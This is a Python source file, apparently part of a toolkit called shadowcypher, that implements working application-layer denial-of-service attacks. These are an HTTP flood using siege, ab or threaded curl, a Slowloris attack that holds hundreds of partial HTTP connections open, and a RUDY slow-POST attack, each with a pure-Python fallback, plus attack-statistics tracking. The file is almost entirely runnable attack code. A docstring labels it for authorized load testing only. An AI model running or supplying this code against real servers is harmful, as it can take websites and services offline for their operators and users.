"""
Layer7 Module — Application-Layer Stress Testing Engine.
HTTP flood, Slowloris, and RUDY via real threading and subprocess.
For authorized load-testing and DoS resilience auditing only.
"""

import socket
import threading
import time
import random
import string
from typing import Dict, Optional

from shadowcypher.core.module import BaseModule
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_target, validate_port


# ── Metric store (shared across attack threads) ──

class _FloodStats:
    def __init__(self):
        self._lock = threading.Lock()
        self.requests_sent: int = 0
        self.bytes_sent: int = 0
        self.errors: int = 0
        self.active_threads: int = 0
        self.start_time: float = 0.0

    def record_request(self, byte_count: int = 0):
        with self._lock:
            self.requests_sent += 1
            self.bytes_sent += byte_count

    def record_error(self):
        with self._lock:
            self.errors += 1

    def snapshot(self) -> Dict:
        with self._lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            return {
                "requests_sent": self.requests_sent,
                "bytes_sent": self.bytes_sent,
                "errors": self.errors,
                "active_threads": self.active_threads,
                "elapsed_seconds": round(elapsed, 2),
                "requests_per_second": round(rps, 2),
            }

    def reset(self):
        with self._lock:
            self.requests_sent = 0
            self.bytes_sent = 0
            self.errors = 0
            self.active_threads = 0
            self.start_time = 0.0


_stats = _FloodStats()
_stop_event = threading.Event()


class Layer7(BaseModule):
    """Application-layer stress test suite: HTTP flood, Slowloris, RUDY."""

    def __init__(self):
        super().__init__(module_name="layer7")

    # ── HTTP Flood ──

    @staticmethod
    def http_flood(
        target_url: str,
        threads: int = 100,
        duration: int = 60,
        method: str = "GET",
        on_output=None,
    ) -> str:
        """
        HTTP flood via hping3 (raw TCP) or siege, depending on availability.
        Falls back to a pure-Python asyncio/threading approach using curl batch.
        Launches via runner.execute_task for consistent lifecycle management.
        """
        if not validate_target(target_url):
            if on_output:
                on_output(f"[LAYER7] ERROR: invalid target_url\n")
            return ""

        import shutil

        if shutil.which("siege"):
            # siege -c <threads> -t <duration>S <url>
            args = [
                "siege",
                "-c", str(min(threads, 255)),
                "-t", f"{duration}S",
                "--no-parser",
                target_url,
            ]
            task_name = "L7_SIEGE_FLOOD"
        elif shutil.which("ab"):
            # Apache Bench: ab -n <total_requests> -c <concurrency> <url>
            total = threads * duration * 10  # approximate request count
            args = [
                "ab",
                "-n", str(total),
                "-c", str(threads),
                "-m", method.upper(),
                target_url,
            ]
            task_name = "L7_AB_FLOOD"
        else:
            # Python threading fallback using curl
            def _python_flood():
                _stop_event.clear()
                _stats.reset()
                _stats.start_time = time.time()
                deadline = time.time() + duration

                def worker():
                    with threading.Lock():
                        _stats.active_threads += 1
                    try:
                        while not _stop_event.is_set() and time.time() < deadline:
                            try:
                                result = runner.execute_task(
                                    "L7_CURL_HIT",
                                    ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                                     "-X", method.upper(), target_url],
                                )
                                _stats.record_request()
                            except Exception:
                                _stats.record_error()
                    finally:
                        with threading.Lock():
                            _stats.active_threads -= 1

                pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
                for t in pool:
                    t.start()

                def reporter():
                    while not _stop_event.is_set() and time.time() < deadline:
                        snap = _stats.snapshot()
                        if on_output:
                            on_output(
                                f"[LAYER7] FLOOD_STATS: {snap['requests_sent']} reqs, "
                                f"{snap['requests_per_second']} rps, "
                                f"{snap['errors']} errors\n"
                            )
                        time.sleep(5)
                    _stop_event.set()

                threading.Thread(target=reporter, daemon=True).start()
                for t in pool:
                    t.join()
                if on_output:
                    on_output(f"[LAYER7] FLOOD_COMPLETE: {_stats.snapshot()}\n")

            threading.Thread(target=_python_flood, daemon=True).start()
            return "L7_PY_FLOOD"

        if on_output:
            on_output(f"[LAYER7] HTTP_FLOOD starting: {method} {target_url} "
                      f"({threads} threads, {duration}s)\n")
        return runner.execute_task(task_name, args, callback=on_output)

    # ── Slowloris ──

    @staticmethod
    def slowloris(
        target_host: str,
        target_port: int = 80,
        num_sockets: int = 200,
        on_output=None,
    ) -> str:
        """
        Slowloris: open many partial HTTP connections and dribble headers
        to exhaust the target's connection pool.
        Pure Python — no external tools required.
        """
        if not validate_target(target_host):
            if on_output:
                on_output(f"[LAYER7] ERROR: invalid target_host\n")
            return ""
        if not validate_port(target_port):
            if on_output:
                on_output(f"[LAYER7] ERROR: invalid port {target_port}\n")
            return ""

        import shutil
        if shutil.which("slowhttptest"):
            # Prefer slowhttptest when available — more reliable
            args = [
                "slowhttptest",
                "-c", str(num_sockets),
                "-H",               # Slowloris mode
                "-i", "10",         # interval between follow-up headers
                "-r", "200",        # connections per second
                "-t", "GET",
                "-u", f"http://{target_host}:{target_port}/",
                "-p", "3",
                "-l", "120",        # test duration seconds
            ]
            if on_output:
                on_output(f"[LAYER7] SLOWLORIS via slowhttptest: {target_host}:{target_port} "
                          f"({num_sockets} sockets)\n")
            return runner.execute_task("L7_SLOWLORIS", args, callback=on_output)

        # Pure Python fallback
        task_id = "L7_SLOWLORIS_PY"

        def _slowloris_worker():
            _stop_event.clear()
            sockets: list = []
            ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")

            def _create_socket() -> Optional[socket.socket]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_host, int(target_port)))
                    # Send partial HTTP GET request — intentionally incomplete
                    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target_host}\r\n".encode())
                    s.send(f"User-Agent: {ua}\r\n".encode())
                    s.send(b"Accept-language: en-US,en;q=0.5\r\n")
                    return s
                except Exception:
                    return None

            if on_output:
                on_output(f"[LAYER7] SLOWLORIS INIT: opening {num_sockets} sockets to "
                          f"{target_host}:{target_port}\n")

            for _ in range(num_sockets):
                s = _create_socket()
                if s:
                    sockets.append(s)

            if on_output:
                on_output(f"[LAYER7] SLOWLORIS HOLDING: {len(sockets)} open connections\n")

            while not _stop_event.is_set():
                # Send a keep-alive header to each socket
                alive = []
                for s in sockets:
                    try:
                        # Keep-alive header dribble — never sends the final \r\n
                        hdr = f"X-a: {random.randint(1, 5000)}\r\n"
                        s.send(hdr.encode())
                        alive.append(s)
                    except Exception:
                        pass

                # Re-fill dropped sockets
                sockets = alive
                while len(sockets) < num_sockets and not _stop_event.is_set():
                    s = _create_socket()
                    if s:
                        sockets.append(s)

                if on_output:
                    on_output(f"[LAYER7] SLOWLORIS: {len(sockets)} sockets alive\n")
                time.sleep(15)

            # Cleanup
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
            if on_output:
                on_output("[LAYER7] SLOWLORIS STOPPED\n")

        threading.Thread(target=_slowloris_worker, daemon=True).start()
        return task_id

    # ── RUDY (R-U-Dead-Yet) ──

    @staticmethod
    def rudy(
        target_url: str,
        content_length: int = 100_000,
        on_output=None,
    ) -> str:
        """
        RUDY (R-U-Dead-Yet): slow POST body attack.
        Sends a large Content-Length but drips POST body 1 byte at a time.
        Ties up server threads waiting for the full body.
        Uses slowhttptest when available, pure Python otherwise.
        """
        if not validate_target(target_url):
            if on_output:
                on_output(f"[LAYER7] ERROR: invalid target_url\n")
            return ""

        import shutil
        if shutil.which("slowhttptest"):
            args = [
                "slowhttptest",
                "-c", "200",
                "-B",               # RUDY mode
                "-i", "110",        # bytes-per-interval
                "-r", "200",
                "-s", str(content_length),
                "-t", "POST",
                "-u", target_url,
                "-p", "3",
                "-l", "120",
            ]
            if on_output:
                on_output(f"[LAYER7] RUDY via slowhttptest: {target_url}\n")
            return runner.execute_task("L7_RUDY", args, callback=on_output)

        # Pure Python RUDY
        task_id = "L7_RUDY_PY"

        def _rudy_worker():
            import urllib.parse
            parsed = urllib.parse.urlparse(target_url if "://" in target_url else f"http://{target_url}")
            host = parsed.hostname or target_url
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            if on_output:
                on_output(f"[LAYER7] RUDY starting: POST {path} to {host}:{port} "
                          f"({content_length} bytes slow body)\n")

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))

                # Send well-formed POST headers with declared Content-Length
                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(headers.encode())

                sent = 0
                while sent < content_length and not _stop_event.is_set():
                    # Send 1 byte of body every 110 ms — extremely slow
                    byte = random.choice(string.ascii_letters).encode()
                    try:
                        s.send(byte)
                        sent += 1
                        if sent % 1000 == 0 and on_output:
                            on_output(f"[LAYER7] RUDY: {sent}/{content_length} bytes sent\n")
                    except Exception:
                        break
                    time.sleep(0.11)

                s.close()
            except Exception as e:
                if on_output:
                    on_output(f"[LAYER7] RUDY error: {e}\n")
            if on_output:
                on_output(f"[LAYER7] RUDY COMPLETE\n")

        threading.Thread(target=_rudy_worker, daemon=True).start()
        return task_id

    # ── Stats & Control ──

    @staticmethod
    def get_flood_stats() -> Dict:
        """Return current attack metrics snapshot."""
        return _stats.snapshot()

    @staticmethod
    def stop_all(on_output=None) -> None:
        """Gracefully stop all running Layer7 attacks."""
        _stop_event.set()
        if on_output:
            on_output("[LAYER7] STOP_ALL: signal sent to all attack threads\n")
